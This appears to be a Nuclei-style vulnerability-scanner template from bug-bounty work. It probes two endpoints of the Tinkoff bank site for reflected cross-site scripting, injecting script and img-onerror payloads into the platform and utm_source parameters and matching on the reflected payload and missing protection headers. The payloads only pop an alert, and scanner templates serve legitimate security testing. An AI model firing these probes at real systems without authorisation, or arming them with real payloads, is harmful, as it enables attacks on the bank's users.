id: tinkoff-xss

info:
  name: Tinkoff - Cross-Site Scripting (XSS)
  author: bugbounty
  severity: high
  description: Reflected XSS in session_info and utm parameters
  tags: xss,tinkoff
  reference:
    - https://portswigger.net/web-security/cross-site-scripting

http:
  - raw:
      - |
        GET /api/common/v1/session_info?platform="><script>alert(document.domain)</script>&sessionid=test HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml

      - |
        GET /cards/debit-cards/tinkoff-black/?utm_source="><img src=x onerror=alert(document.domain)> HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"><script>alert(document.domain)</script>'
          - '"><img src=x onerror=alert(document.domain)>'
        condition: or

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "X-XSS-Protection: 0"
          - "X-Content-Type-Options"
        negative: true
        condition: or
